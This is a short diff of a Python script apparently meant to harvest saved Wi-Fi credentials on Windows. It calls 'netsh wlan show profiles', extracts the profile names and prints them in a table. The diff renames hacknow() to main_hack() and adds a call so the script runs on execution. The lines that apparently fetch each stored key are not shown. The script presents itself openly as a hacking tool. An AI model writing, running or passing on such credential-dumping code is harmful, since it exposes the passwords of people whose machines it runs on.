@@ -1,8 +1,7 @@
-import subprocess
-import time
+def main_hack():
+    import subprocess
+    import time
 
-
-def hacknow():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
@@ -17,3 +16,5 @@ def hacknow():
             print("{:<30}|  {:<}".format(i, ""))
 
     time.sleep(5)
+
+main_hack()
